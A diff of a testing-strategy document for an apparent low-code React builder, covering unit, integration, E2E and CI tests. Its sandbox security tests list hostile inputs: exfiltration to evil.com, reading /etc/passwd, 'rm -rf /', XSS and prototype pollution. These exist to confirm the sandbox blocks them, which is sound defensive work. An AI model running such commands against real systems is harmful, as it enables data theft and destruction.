-          type: 'expression',
-          expression: 'user.firstName + " " + user.lastName'
+    it('should load manifest from JSON', async () => {
+      const json = JSON.stringify({
+        schemaVersion: '1.0.0',
+        components: {
+          comp_001: {
+            id: 'comp_001',
+            displayName: 'Button',
+            type: 'PrimitiveComponent',
+            properties: {},
+          },
         },
-        isActive: {
-          type: 'expression',
-          expression: 'user.status === "active"'
-        }
-      }
-    };
-    
-    const Component = generateAndImportComponent(manifest);
-    
-    const testProps = {
-      user: { 
-        firstName: 'John', 
-        lastName: 'Doe', 
-        status: 'active' 
-      }
-    };
-    
-    const { container } = render(<Component {...testProps} />);
-    
-    expect(container.textContent).toContain('John Doe');
-    expect(container.querySelector('.active')).toBeInTheDocument();
-  });
-  
-  test('custom functions execute correctly', async () => {
-    const globalFunctions = `
-      export function formatCurrency(amount) {
-        return new Intl.NumberFormat('en-US', {
-          style: 'currency',
-          currency: 'USD'
-        }).format(amount);
-      }
-    `;
-    
-    const manifest = {
-      id: 'comp_001',
-      displayName: 'ProductCard',
-      properties: {
-        formattedPrice: {
-          type: 'customFunction',
-          functionName: 'formatCurrency',
-          args: ['props.price']
-        }
-      }
-    };
-    
-    // Setup global functions
-    const globalFunctionsModule = requireFromString(globalFunctions);
-    global.formatCurrency = globalFunctionsModule.formatCurrency;
-    
-    const Component = generateAndImportComponent(manifest);
-    
-    const { container } = render(<Component price={29.99} />);
-    
-    expect(container.textContent).toContain('$29.99');
+      });
+
+      await manager.fromJSON(json);
+
+      const component = manager.getComponent('comp_001');
+      expect(component).toBeDefined();
+      expect(component.displayName).toBe('Button');
+    });
   });
 });
 ```
 
----
+### Example: Code Generator Tests
 
-## 6. Performance Testing
-
-### Load Testing
 ```typescript
-// tests/performance/LoadTesting.test.ts
-describe('Performance under load', () => {
-  test('handles large manifests efficiently', async () => {
-    const largeManifest = generateManifestWithComponents(1000);
-    
-    const startTime = performance.now();
-    
-    const manager = new ManifestManager();
-    await manager.load(largeManifest);
-    
-    const loadTime = performance.now() - startTime;
-    expect(loadTime).toBeLessThan(1000); // Should load in < 1 second
-    
-    // Test operations on large manifest
-    const operationStart = performance.now();
-    manager.addComponent('root', { id: 'new_comp', type: 'button' });
-    const operationTime = performance.now() - operationStart;
-    
-    expect(operationTime).toBeLessThan(50); // Operations should be fast
+// tests/unit/generator/react-generator.test.ts
+import { describe, it, expect } from 'vitest';
+import { ReactGenerator } from '@/engine/generator/react';
+import { ComponentSchema } from '@/shared/types';
+
+describe('ReactGenerator', () => {
+  const generator = new ReactGenerator();
+
+  describe('Basic Component Generation', () => {
+    it('should generate simple component with props', () => {
+      const schema: ComponentSchema = {
+        id: 'comp_001',
+        displayName: 'Button',
+        type: 'PrimitiveComponent',
+        properties: {
+          label: {
+            type: 'prop',
+            dataType: 'string',
+            required: true,
+          },
+          disabled: {
+            type: 'prop',
+            dataType: 'boolean',
+            default: false,
+          },
+        },
+      };
+
+      const code = generator.generateComponent(schema);
+
+      expect(code).toContain('export function Button');
+      expect(code).toContain('{ label, disabled = false }');
+      expect(code).toContain('@rise:generated');
+    });
+
+    it('should generate component with static properties', () => {
+      const schema: ComponentSchema = {
+        id: 'comp_001',
+        displayName: 'Header',
+        type: 'PrimitiveComponent',
+        properties: {
+          title: {
+            type: 'static',
+            value: 'Welcome',
+          },
+        },
+      };
+
+      const code = generator.generateComponent(schema);
+
+      expect(code).toContain('Welcome');
+    });
   });
-  
-  test('expression evaluation scales with complexity', () => {
-    const expressions = [
-      'user.name', // Simple
-      'user.firstName + " " + user.lastName', // Medium
-      'items.filter(i => i.active).map(i => i.name).slice(0, 10).join(", ")', // Complex
-      'data.reduce((acc, item) => acc + item.values.map(v => v * 2).reduce((a, b) => a + b, 0), 0)' // Very complex
-    ];
-    
-    const executor = new ExpressionExecutor();
-    const context = {
-      user: { firstName: 'John', lastName: 'Doe', name: 'John Doe' },
-      items: Array(100).fill({ active: true, name: 'Item' }),
-      data: Array(50).fill({ values: [1, 2, 3, 4, 5] })
-    };
-    
-    expressions.forEach((expr, index) => {
-      const times: number[] = [];
-      
-      // Run expression 10 times
-      for (let i = 0; i < 10; i++) {
-        const start = performance.now();
-        executor.execute(expr, context);
-        const time = performance.now() - start;
-        times.push(time);
-      }
-      
-      const avgTime = times.reduce((a, b) => a + b) / times.length;
-      
-      // Even complex expressions should be fast
-      expect(avgTime).toBeLessThan(10); // < 10ms average
+
+  describe('Import Generation', () => {
+    it('should generate imports for child components', () => {
+      const schema: ComponentSchema = {
+        id: 'comp_001',
+        displayName: 'Card',
+        type: 'CompositeComponent',
+        children: ['comp_header_001', 'comp_body_001'],
+        properties: {},
+      };
+
+      const code = generator.generateComponent(schema, {
+        childComponents: [
+          { id: 'comp_header_001', displayName: 'Header' },
+          { id: 'comp_body_001', displayName: 'Body' },
+        ],
+      });
+
+      expect(code).toContain("import Header from './Header'");
+      expect(code).toContain("import Body from './Body'");
+    });
+
+    it('should not duplicate imports', () => {
+      const schema: ComponentSchema = {
+        id: 'comp_001',
+        displayName: 'Parent',
+        type: 'CompositeComponent',
+        children: ['comp_child_001', 'comp_child_001'], // Duplicate
+        properties: {},
+      };
+
+      const code = generator.generateComponent(schema, {
+        childComponents: [
+          { id: 'comp_child_001', displayName: 'Child' },
+        ],
+      });
+
+      const importCount = (code.match(/import Child from/g) || []).length;
+      expect(importCount).toBe(1);
+    });
+  });
+
+  describe('Code Quality', () => {
+    it('should generate code that passes ESLint', async () => {
+      const schema: ComponentSchema = {
+        id: 'comp_001',
+        displayName: 'Button',
+        type: 'PrimitiveComponent',
+        properties: {
+          label: { type: 'prop', dataType: 'string' },
+        },
+      };
+
+      const code = generator.generateComponent(schema);
+
+      const { ESLint } = await import('eslint');
+      const eslint = new ESLint();
+      const results = await eslint.lintText(code);
+
+      expect(results[0].errorCount).toBe(0);
+    });
+
+    it('should generate formatted code (Prettier)', async () => {
+      const schema: ComponentSchema = {
+        id: 'comp_001',
+        displayName: 'Button',
+        type: 'PrimitiveComponent',
+        properties: {},
+      };
+
+      const code = generator.generateComponent(schema);
+
+      const prettier = await import('prettier');
+      const formatted = await prettier.format(code, {
+        parser: 'typescript',
+      });
+
+      // Code should already be formatted
+      expect(code).toBe(formatted);
+    });
+  });
+});
+```
+
+### Example: Security Tests
+
+```typescript
+// tests/unit/security/sandbox.test.ts
+import { describe, it, expect } from 'vitest';
+import { ExpressionSandbox } from '@/engine/security/sandbox';
+
+describe('ExpressionSandbox', () => {
+  const sandbox = new ExpressionSandbox();
+
+  describe('Safe Expressions', () => {
+    it('should execute simple math', async () => {
+      const result = await sandbox.execute('2 + 2', {});
+      expect(result).toBe(4);
+    });
+
+    it('should access provided context', async () => {
+      const context = {
+        props: { name: 'John' },
+        state: { count: 5 },
+      };
+
+      const result = await sandbox.execute(
+        'props.name + " " + state.count',
+        context
+      );
+
+      expect(result).toBe('John 5');
+    });
+
+    it('should allow Math operations', async () => {
+      const result = await sandbox.execute('Math.round(3.7)', {});
+      expect(result).toBe(4);
+    });
+
+    it('should allow Date operations', async () => {
+      const result = await sandbox.execute(
+        'new Date("2025-10-25").getFullYear()',
+        {}
+      );
+      expect(result).toBe(2025);
+    });
+  });
+
+  describe('Blocked Operations', () => {
+    it('should block eval()', async () => {
+      await expect(
+        sandbox.execute('eval("alert(1)")', {})
+      ).rejects.toThrow('eval is not allowed');
+    });
+
+    it('should block Function constructor', async () => {
+      await expect(
+        sandbox.execute('new Function("return 1")()', {})
+      ).rejects.toThrow('Function constructor is not allowed');
+    });
+
+    it('should block setTimeout', async () => {
+      await expect(
+        sandbox.execute('setTimeout(() => {}, 100)', {})
+      ).rejects.toThrow('setTimeout is not allowed');
+    });
+
+    it('should block fetch', async () => {
+      await expect(
+        sandbox.execute('fetch("https://evil.com")', {})
+      ).rejects.toThrow('fetch is not allowed');
+    });
+
+    it('should block __proto__ access', async () => {
+      await expect(
+        sandbox.execute('({}).__proto__.polluted = true', {})
+      ).rejects.toThrow('__proto__ is not allowed');
+    });
+
+    it('should block prototype manipulation', async () => {
+      await expect(
+        sandbox.execute('Array.prototype.push = null', {})
+      ).rejects.toThrow('prototype modification is not allowed');
+    });
+  });
+
+  describe('Resource Limits', () => {
+    it('should timeout long-running expressions', async () => {
+      await expect(
+        sandbox.execute('while(true) {}', {})
+      ).rejects.toThrow('Expression timeout');
+    });
+
+    it('should limit memory usage', async () => {
+      await expect(
+        sandbox.execute('new Array(1000000000).fill(1)', {})
+      ).rejects.toThrow(/memory/i);
+    });
+  });
+
+  describe('Error Handling', () => {
+    it('should handle syntax errors gracefully', async () => {
+      await expect(
+        sandbox.execute('props.name +', {})
+      ).rejects.toThrow(/syntax/i);
+    });
+
+    it('should handle runtime errors', async () => {
+      await expect(
+        sandbox.execute('props.user.name', { props: {} })
+      ).rejects.toThrow(/undefined/i);
     });
   });
 });
@@ -1046,293 +559,741 @@ describe('Performance under load', () => {
 
 ---
 
-## 7. Manual Testing Checklist
+## Integration Testing (30% of tests)
 
-### UX/UI Testing
+### Critical Workflows to Test
+
+1. **Create Project Workflow**
+2. **Add Component Workflow**
+3. **Generate & Preview Workflow**
+4. **AI Component Generation Workflow**
+5. **Plugin Loading Workflow**
+
+### Example: Create Project Integration Test
+
+```typescript
+// tests/integration/workflows/create-project.test.ts
+import { describe, it, expect, beforeEach, afterEach } from 'vitest';
+import { ProjectManager } from '@/engine/project/manager';
+import { ManifestManager } from '@/engine/manifest/manager';
+import { CodeGenerator } from '@/engine/generator/generator';
+import fs from 'fs-extra';
+import path from 'path';
+
+describe('Create Project Workflow', () => {
+  let testDir: string;
+  let projectManager: ProjectManager;
+
+  beforeEach(async () => {
+    testDir = path.join(__dirname, '../../.tmp', `test-${Date.now()}`);
+    await fs.ensureDir(testDir);
+    projectManager = new ProjectManager();
+  });
+
+  afterEach(async () => {
+    await fs.remove(testDir);
+  });
+
+  it('should create complete React project', async () => {
+    // 1. Create project
+    const projectPath = path.join(testDir, 'my-app');
+    
+    await projectManager.createProject({
+      name: 'my-app',
+      framework: 'react',
+      path: projectPath,
+      typescript: false,
+    });
+
+    // 2. Verify project structure
+    expect(await fs.pathExists(path.join(projectPath, 'package.json'))).toBe(true);
+    expect(await fs.pathExists(path.join(projectPath, '.lowcode'))).toBe(true);
+    expect(await fs.pathExists(path.join(projectPath, 'src'))).toBe(true);
+    expect(await fs.pathExists(path.join(projectPath, 'vite.config.js'))).toBe(true);
+
+    // 3. Verify manifest
+    const manifest = await ManifestManager.load(
+      path.join(projectPath, '.lowcode/manifest.json')
+    );
+    
+    expect(manifest.metadata.framework).toBe('react');
+    expect(manifest.metadata.projectName).toBe('my-app');
+
+    // 4. Verify package.json
+    const packageJson = await fs.readJson(
+      path.join(projectPath, 'package.json')
+    );
+    
+    expect(packageJson.dependencies).toHaveProperty('react');
+    expect(packageJson.dependencies).toHaveProperty('react-dom');
+    expect(packageJson.devDependencies).toHaveProperty('vite');
+
+    // 5. Verify can install dependencies
+    const { execSync } = require('child_process');
+    execSync('npm install', { cwd: projectPath });
+
+    expect(await fs.pathExists(
+      path.join(projectPath, 'node_modules')
+    )).toBe(true);
+
+    // 6. Verify can build
+    execSync('npm run build', { cwd: projectPath });
+
+    expect(await fs.pathExists(
+      path.join(projectPath, 'dist')
+    )).toBe(true);
+  });
+});
 ```
-🎨 Visual Editor UX:
-□ Component tree feels responsive and intuitive
-□ Drag-and-drop works smoothly
-□ Property panel updates instantly
-□ Context menus appear in logical places
-□ Keyboard shortcuts work consistently
 
-🤖 AI Integration UX:
-□ AI suggestions feel helpful, not intrusive
-□ AI generation time feels reasonable (< 10 seconds)
-□ User can easily accept/reject AI suggestions
-□ AI explanations are clear and actionable
-□ Fallback when AI is unavailable works well
+### Example: Component Generation Integration Test
 
-📱 Preview System UX:
-□ Preview updates feel instant (< 500ms)
-□ Error states are clear and helpful
-□ Responsive preview works across screen sizes
-□ Hot reload doesn't lose user state unexpectedly
+```typescript
+// tests/integration/workflows/add-component.test.ts
+import { describe, it, expect, beforeEach } from 'vitest';
+import { ManifestManager } from '@/engine/manifest/manager';
+import { CodeGenerator } from '@/engine/generator/generator';
+import { ComponentSchema } from '@/shared/types';
 
-🔧 Expression Editor UX:
-□ Autocomplete feels natural and fast
-□ Syntax highlighting is helpful
-□ Error messages are clear and actionable
-□ Switching between modes is seamless
-```
+describe('Add Component Integration', () => {
+  let manifest: ManifestManager;
+  let generator: CodeGenerator;
 
-### Edge Case Testing
-```
-🔍 Edge Cases to Test Manually:
+  beforeEach(() => {
+    manifest = new ManifestManager();
+    generator = new CodeGenerator();
+  });
 
-Component Management:
-□ Very deeply nested components (10+ levels)
-□ Components with circular reference attempts
-□ Deleting components with many dependencies
-□ Renaming components used in expressions
-□ Copy/paste complex component structures
+  it('should add component and generate code', async () => {
+    // 1. Add component to manifest
+    const component: ComponentSchema = {
+      id: 'comp_button_001',
+      displayName: 'Button',
+      type: 'PrimitiveComponent',
+      properties: {
+        label: {
+          type: 'prop',
+          dataType: 'string',
+          required: true,
+        },
+        onClick: {
+          type: 'prop',
+          dataType: 'function',
+        },
+      },
+    };
 
-Expression Edge Cases:
-□ Very long expressions (1000+ characters)
-□ Expressions with special characters and unicode
-□ Expressions referencing non-existent properties
-□ Expressions with deeply nested object access
-□ Expressions that change frequently (performance)
+    manifest.addComponent(component);
 
-AI Edge Cases:
-□ AI generating invalid/impossible components
-□ AI taking very long to respond (timeout handling)
-□ AI generating components with security issues
-□ Very long/complex user prompts
-□ Non-English prompts and responses
+    // 2. Generate code
+    const code = generator.generateComponent(component);
 
-File System Edge Cases:
-□ Very large projects (100+ components)
-□ Projects with missing files
-□ Corrupted manifest files
-□ Read-only file system permissions
-□ Network drives or cloud storage
+    // 3. Verify code structure
+    expect(code).toContain('export function Button');
+    expect(code).toContain('label');
+    expect(code).toContain('onClick');
+
+    // 4. Verify code compiles
+    const { transformSync } = await import('@babel/core');
+    const result = transformSync(code, {
+      presets: ['@babel/preset-react'],
+    });
+
+    expect(result.code).toBeDefined();
+
+    // 5. Verify ESLint passes
+    const { ESLint } = await import('eslint');
+    const eslint = new ESLint();
+    const lintResults = await eslint.lintText(code);
+
+    expect(lintResults[0].errorCount).toBe(0);
+  });
+
+  it('should handle component with children', async () => {
+    // Add parent
+    const parent: ComponentSchema = {
+      id: 'comp_card_001',
+      displayName: 'Card',
+      type: 'CompositeComponent',
+      children: ['comp_header_001', 'comp_body_001'],
+      properties: {},
+    };
+
+    manifest.addComponent(parent);
+
+    // Add children
+    const header: ComponentSchema = {
+      id: 'comp_header_001',
+      displayName: 'CardHeader',
+      type: 'PrimitiveComponent',
+      properties: {
+        title: { type: 'static', value: 'Card Title' },
+      },
+    };
+
+    const body: ComponentSchema = {
+      id: 'comp_body_001',
+      displayName: 'CardBody',
+      type: 'PrimitiveComponent',
+      properties: {},
+    };
+
+    manifest.addComponent(header);
+    manifest.addComponent(body);
+
+    // Generate all code
+    const parentCode = generator.generateComponent(parent, {
+      manifest: manifest.toJSON(),
+    });
+
+    const headerCode = generator.generateComponent(header);
+    const bodyCode = generator.generateComponent(body);
+
+    // Verify imports
+    expect(parentCode).toContain("import CardHeader from './CardHeader'");
+    expect(parentCode).toContain("import CardBody from './CardBody'");
+
+    // Verify usage
+    expect(parentCode).toContain('<CardHeader');
+    expect(parentCode).toContain('<CardBody');
+  });
+});
 ```
 
 ---
 
-## 8. Test Automation Pipeline
+## E2E Testing (10% of tests)
 
-### CI/CD Integration
+### Critical User Journeys
+
+1. **First-time user creates project**
+2. **User adds and edits components**
+3. **User previews application**
+4. **User uses AI to generate component**
+5. **User exports project**
+
+### Example: Playwright E2E Test
+
+```typescript
+// tests/e2e/user-flows/first-project.spec.ts
+import { test, expect } from '@playwright/test';
+import { ElectronApplication, _electron as electron } from 'playwright';
+
+test.describe('First Project Creation', () => {
+  let app: ElectronApplication;
+
+  test.beforeAll(async () => {
+    app = await electron.launch({
+      args: ['./dist/main/index.js'],
+    });
+  });
+
+  test.afterAll(async () => {
+    await app.close();
+  });
+
+  test('user creates first project', async () => {
+    const window = await app.firstWindow();
+
+    // 1. Click "New Project"
+    await window.click('[data-testid="new-project-button"]');
+
+    // 2. Fill in project details
+    await window.fill('[data-testid="project-name"]', 'my-first-app');
+    await window.selectOption('[data-testid="framework-select"]', 'react');
+    await window.fill('[data-testid="project-path"]', '/tmp/test-project');
+
+    // 3. Create project
+    await window.click('[data-testid="create-project-submit"]');
+
+    // 4. Wait for project to load
+    await window.waitForSelector('[data-testid="component-tree"]', {
+      timeout: 10000,
+    });
+
+    // 5. Verify project loaded
+    const projectName = await window.textContent(
+      '[data-testid="project-name-display"]'
+    );
+    expect(projectName).toBe('my-first-app');
+
+    // 6. Verify default component exists
+    const componentTree = await window.textContent(
+      '[data-testid="component-tree"]'
+    );
+    expect(componentTree).toContain('App');
+  });
+
+  test('user adds component', async () => {
+    const window = await app.firstWindow();
+
+    // Assume project is already open
+
+    // 1. Right-click in component tree
+    await window.click('[data-testid="component-tree-root"]', {
+      button: 'right',
+    });
+
+    // 2. Click "Add Component"
+    await window.click('[data-testid="context-menu-add-component"]');
+
+    // 3. Select component type
+    await window.click('[data-testid="component-type-button"]');
+
+    // 4. Fill in component name
+    await window.fill('[data-testid="component-name-input"]', 'MyButton');
+
+    // 5. Confirm
+    await window.click('[data-testid="add-component-confirm"]');
+
+    // 6. Verify component added
+    await window.waitForSelector('[data-testid="component-MyButton"]');
+
+    // 7. Verify code generated
+    await window.click('[data-testid="code-tab"]');
+    const code = await window.textContent('[data-testid="code-editor"]');
+    expect(code).toContain('export function MyButton');
+  });
+
+  test('user previews app', async () => {
+    const window = await app.firstWindow();
+
+    // 1. Click Preview tab
+    await window.click('[data-testid="preview-tab"]');
+
+    // 2. Wait for preview to load
+    await window.waitForSelector('[data-testid="preview-frame"]', {
+      timeout: 15000,
+    });
+
+    // 3. Verify preview iframe exists
+    const frame = window.frame({ name: 'preview' });
+    expect(frame).toBeDefined();
+
+    // 4. Verify app renders in preview
+    const content = await frame.textContent('body');
+    expect(content.length).toBeGreaterThan(0);
+  });
+});
+```
+
+---
+
+## Generated Code Testing
+
+### Automated Tests for Generated Projects
+
+```typescript
+// tests/generated-code/build.test.ts
+import { describe, it, expect } from 'vitest';
+import { execSync } from 'child_process';
+import fs from 'fs-extra';
+import path from 'path';
+
+describe('Generated Project Build', () => {
+  it('should build without errors', async () => {
+    const projectPath = path.join(__dirname, '../../.tmp/test-project');
+
+    // Generate test project
+    await generateTestProject(projectPath);
+
+    // Install dependencies
+    execSync('npm install', { cwd: projectPath });
+
+    // Build project
+    const buildOutput = execSync('npm run build', {
+      cwd: projectPath,
+      encoding: 'utf8',
+    });
+
+    // Verify build succeeded
+    expect(buildOutput).not.toContain('error');
+    expect(await fs.pathExists(path.join(projectPath, 'dist'))).toBe(true);
+
+    // Verify dist contains files
+    const distFiles = await fs.readdir(path.join(projectPath, 'dist'));
+    expect(distFiles.length).toBeGreaterThan(0);
+  });
+
+  it('should pass ESLint', async () => {
+    const projectPath = path.join(__dirname, '../../.tmp/test-project');
+
+    await generateTestProject(projectPath);
+
+    const lintOutput = execSync('npm run lint', {
+      cwd: projectPath,
+      encoding: 'utf8',
+    });
+
+    expect(lintOutput).not.toContain('error');
+  });
+
+  it('should have no TypeScript errors (if TS enabled)', async () => {
+    const projectPath = path.join(__dirname, '../../.tmp/test-project-ts');
+
+    await generateTestProject(projectPath, { typescript: true });
+
+    const typeCheckOutput = execSync('npm run type-check', {
+      cwd: projectPath,
+      encoding: 'utf8',
+    });
+
+    expect(typeCheckOutput).not.toContain('error');
+  });
+});
+```
+
+---
+
+## Security Testing
+
+### Penetration Testing Suite
+
+```typescript
+// tests/security/penetration/expression-injection.test.ts
+import { describe, it, expect } from 'vitest';
+import { ExpressionSandbox } from '@/engine/security/sandbox';
+
+describe('Expression Injection Attacks', () => {
+  const sandbox = new ExpressionSandbox();
+
+  it('should block XSS attempts', async () => {
+    const attacks = [
+      '<script>alert("XSS")</script>',
+      'javascript:alert(1)',
+      'onload="alert(1)"',
+      '"><script>alert(1)</script>',
+    ];
+
+    for (const attack of attacks) {
+      await expect(
+        sandbox.execute(attack, {})
+      ).rejects.toThrow();
+    }
+  });
+
+  it('should block prototype pollution', async () => {
+    const attacks = [
+      '({}).__proto__.polluted = true',
+      'Object.prototype.polluted = true',
+      'constructor.prototype.polluted = true',
+    ];
+
+    for (const attack of attacks) {
+      await expect(
+        sandbox.execute(attack, {})
+      ).rejects.toThrow();
+    }
+
+    // Verify not polluted
+    expect(({} as any).polluted).toBeUndefined();
+  });
+
+  it('should block code execution attempts', async () => {
+    const attacks = [
+      'eval("alert(1)")',
+      'Function("alert(1)")()',
+      'setTimeout("alert(1)", 0)',
+      'new Function("return this")()',
+    ];
+
+    for (const attack of attacks) {
+      await expect(
+        sandbox.execute(attack, {})
+      ).rejects.toThrow();
+    }
+  });
+
+  it('should block file system access', async () => {
+    const attacks = [
+      'require("fs").readFileSync("/etc/passwd")',
+      'process.exit()',
+      'require("child_process").exec("rm -rf /")',
+    ];
+
+    for (const attack of attacks) {
+      await expect(
+        sandbox.execute(attack, {})
+      ).rejects.toThrow();
+    }
+  });
+
+  it('should block network access', async () => {
+    const attacks = [
+      'fetch("https://evil.com/steal?data=secret")',
+      'new XMLHttpRequest()',
+      'new WebSocket("ws://evil.com")',
+    ];
+
+    for (const attack of attacks) {
+      await expect(
+        sandbox.execute(attack, {})
+      ).rejects.toThrow();
+    }
+  });
+});
+```
+
+---
+
+## CI/CD Integration
+
+### GitHub Actions Workflow
+
 ```yaml
 # .github/workflows/test.yml
 name: Test Suite
 
-on: [push, pull_request]
+on:
+  push:
+    branches: [main, develop]
+  pull_request:
+    branches: [main, develop]
 
 jobs:
   unit-tests:
     runs-on: ubuntu-latest
+    
     steps:
       - uses: actions/checkout@v3
-      - uses: actions/setup-node@v3
+      
+      - name: Setup Node.js
+        uses: actions/setup-node@v3
         with:
           node-version: '18'
-      - run: npm ci
-      - run: npm run test:unit
-      - run: npm run test:coverage
+          cache: 'npm'
       
+      - name: Install dependencies
+        run: npm ci
+      
+      - name: Run unit tests
+        run: npm run test:unit
+      
+      - name: Upload coverage
+        uses: codecov/codecov-action@v3
+        with:
+          files: ./coverage/coverage-final.json
+
   integration-tests:
     runs-on: ubuntu-latest
+    
     steps:
       - uses: actions/checkout@v3
-      - uses: actions/setup-node@v3
-      - run: npm ci
-      - run: npm run test:integration
       
+      - name: Setup Node.js
+        uses: actions/setup-node@v3
+        with:
+          node-version: '18'
+      
+      - name: Install dependencies
+        run: npm ci
+      
+      - name: Run integration tests
+        run: npm run test:integration
+
   e2e-tests:
-    runs-on: ${{ matrix.os }}
-    strategy:
-      matrix:
-        os: [ubuntu-latest, windows-latest, macos-latest]
+    runs-on: ubuntu-latest
+    
     steps:
       - uses: actions/checkout@v3
-      - uses: actions/setup-node@v3
-      - run: npm ci
-      - run: npm run build
-      - run: npm run test:e2e
-      - uses: actions/upload-artifact@v3
-        if: failure()
+      
+      - name: Setup Node.js
+        uses: actions/setup-node@v3
         with:
-          name: e2e-screenshots-${{ matrix.os }}
-          path: tests/e2e/screenshots/
-          
+          node-version: '18'
+      
+      - name: Install dependencies
+        run: npm ci
+      
+      - name: Install Playwright
+        run: npx playwright install --with-deps
+      
+      - name: Build app
+        run: npm run build
+      
+      - name: Run E2E tests
+        run: npm run test:e2e
+      
+      - name: Upload test results
+        if: always()
+        uses: actions/upload-artifact@v3
+        with:
+          name: playwright-report
+          path: playwright-report/
+
   security-tests:
     runs-on: ubuntu-latest
+    
     steps:
       - uses: actions/checkout@v3
-      - uses: actions/setup-node@v3
-      - run: npm ci
-      - run: npm run test:security
-      - run: npm audit
-```
-
-### Test Data Management
-```typescript
-// tests/fixtures/TestDataFactory.ts
-export class TestDataFactory {
-  static createBasicManifest() {
-    return {
-      schemaVersion: '1.0.0',
-      metadata: {
-        projectName: 'Test Project',
-        framework: 'react'
-      },
-      components: {
-        root: {
-          id: 'root',
-          displayName: 'App',
-          type: 'app',
-          children: []
-        }
-      },
-      globalFunctions: {},
-      globalState: {}
-    };
-  }
-  
-  static createComplexComponent() {
-    return {
-      id: 'comp_user_card_001',
-      displayName: 'UserCard',
-      type: 'composite',
-      properties: {
-        user: { type: 'prop', dataType: 'object', required: true },
-        displayName: {
-          type: 'expression',
-          expression: 'user.firstName + " " + user.lastName'
-        },
-        avatarUrl: {
-          type: 'customFunction',
-          functionName: 'getAvatarUrl',
-          args: ['props.user.id']
-        }
-      },
-      eventHandlers: {
-        onClick: {
-          type: 'navigation',
-          target: '/profile/${props.user.id}'
-        }
-      }
-    };
-  }
-  
-  static createMockAIResponse() {
-    return {
-      success: true,
-      component: this.createComplexComponent(),
-      confidence: 0.95,
-      explanation: 'Generated user card component with avatar and navigation'
-    };
-  }
-}
+      
+      - name: Setup Node.js
+        uses: actions/setup-node@v3
+        with:
+          node-version: '18'
+      
+      - name: Install dependencies
+        run: npm ci
+      
+      - name: Run security tests
+        run: npm run test:security
+      
+      - name: Run npm audit
+        run: npm audit --audit-level=moderate
 ```
 
 ---
 
-## 9. Testing Tools & Setup
+## Test Execution Strategy
 
-### Essential Testing Dependencies
-```json
-{
-  "devDependencies": {
-    // Unit Testing
-    "@testing-library/react": "^13.4.0",
-    "@testing-library/jest-dom": "^5.16.5",
-    "@testing-library/user-event": "^14.4.3",
-    "jest": "^29.5.0",
-    "jest-environment-jsdom": "^29.5.0",
-    
-    // E2E Testing
-    "@playwright/test": "^1.35.0",
-    "electron-playwright-helpers": "^1.7.1",
-    
-    // Code Quality
-    "eslint": "^8.45.0",
-    "eslint-plugin-testing-library": "^5.11.0",
-    "eslint-plugin-jest-dom": "^5.0.1",
-    
-    // Security Testing
-    "audit-ci": "^6.6.1",
-    "semgrep": "^1.31.1",
-    
-    // Performance Testing
-    "autocannon": "^7.12.0",
-    "clinic": "^11.0.1",
-    
-    // Mocking
-    "msw": "^1.2.2",
-    "jest-electron": "^0.1.12"
-  }
-}
+### Local Development
+
+```bash
+# Fast feedback loop (< 30 seconds)
+npm run test:watch        # Unit tests only, watch mode
+
+# Pre-commit (< 2 minutes)
+npm run test:quick        # Unit + critical integration
+
+# Pre-push (< 5 minutes)
+npm run test              # All tests except E2E
+
+# Full suite (< 15 minutes)
+npm run test:all          # Everything including E2E
 ```
 
-### Test Configuration
-```javascript
-// jest.config.js
-module.exports = {
-  testEnvironment: 'jsdom',
-  setupFilesAfterEnv: ['<rootDir>/tests/setup.ts'],
-  moduleNameMapping: {
-    '^@/(.*)$': '<rootDir>/src/$1'
+### CI/CD
+
+- **Pull Request**: Unit + Integration tests (5 min)
+- **Merge to develop**: Full suite except E2E (10 min)
+- **Release candidate**: Full suite including E2E (15 min)
+
+---
+
+## Test Data Management
+
+### Fixtures
+
+```typescript
+// tests/fixtures/schemas.ts
+export const SAMPLE_BUTTON: ComponentSchema = {
+  id: 'comp_button_001',
+  displayName: 'Button',
+  type: 'PrimitiveComponent',
+  properties: {
+    label: { type: 'prop', dataType: 'string', required: true },
+    disabled: { type: 'prop', dataType: 'boolean', default: false },
   },
-  collectCoverageFrom: [
-    'src/**/*.{ts,tsx}',
-    '!src/**/*.d.ts',
-    '!src/**/*.stories.tsx'
-  ],
-  coverageThreshold: {
-    global: {
-      branches: 80,
-      functions: 80,
-      lines: 80,
-      statements: 80
-    }
+};
+
+export const SAMPLE_CARD: ComponentSchema = {
+  id: 'comp_card_001',
+  displayName: 'Card',
+  type: 'CompositeComponent',
+  children: ['comp_header_001', 'comp_body_001'],
+  properties: {},
+};
+
+export const SAMPLE_MANIFEST = {
+  schemaVersion: '1.0.0',
+  level: 1,
+  metadata: {
+    projectName: 'Test Project',
+    framework: 'react',
   },
-  testMatch: [
-    '<rootDir>/tests/**/*.test.{ts,tsx}'
-  ]
+  components: {
+    comp_button_001: SAMPLE_BUTTON,
+    comp_card_001: SAMPLE_CARD,
+  },
 };
 ```
 
 ---
 
-## 10. Success Metrics
+## Coverage Reporting
 
-### Testing KPIs
+### Configuration
+
+```typescript
+// vitest.config.ts
+import { defineConfig } from 'vitest/config';
+
+export default defineConfig({
+  test: {
+    coverage: {
+      provider: 'c8',
+      reporter: ['text', 'json', 'html', 'lcov'],
+      exclude: [
+        'node_modules/',
+        'tests/',
+        '**/*.test.ts',
+        '**/*.spec.ts',
+        '**/types.ts',
+      ],
+      statements: 80,
+      branches: 75,
+      functions: 80,
+      lines: 80,
+    },
+  },
+});
 ```
-🎯 Coverage Targets:
-- Unit Test Coverage: > 85%
-- Integration Test Coverage: > 75%
-- E2E Test Coverage: > 60%
-- Security Test Coverage: 100% of attack vectors
 
-📈 Performance Targets:
-- Unit Tests: Complete in < 30 seconds
-- Integration Tests: Complete in < 2 minutes  
-- E2E Tests: Complete in < 10 minutes
-- Full Suite: Complete in < 15 minutes
+### Coverage Reports
 
-🔍 Quality Metrics:
-- Generated Code ESLint Score: 0 errors, < 5 warnings
-- AI Generation Success Rate: > 80%
-- Expression Security Block Rate: 100% of dangerous patterns
-- User Journey Completion Rate: > 95%
+Generate and view coverage:
 
-🚀 Release Criteria:
-- All tests passing on all platforms
-- Security audit with 0 high/critical issues
-- Performance benchmarks within targets
-- Manual UX review complete
-- Documentation up to date
+```bash
+npm run test:coverage
+open coverage/index.html
 ```
 
-This comprehensive testing strategy ensures Rise delivers a reliable, secure, and performant visual development experience while maintaining high code quality in generated output.
+**Fail build if coverage drops below thresholds.**
+
+---
+
+## Test Maintenance
+
+### Guidelines
+
+1. **Keep tests fast**: Unit tests < 50ms each
+2. **One assertion per test**: Focus on single behavior
+3. **Clear test names**: Describe what's being tested
+4. **Avoid test interdependence**: Each test independent
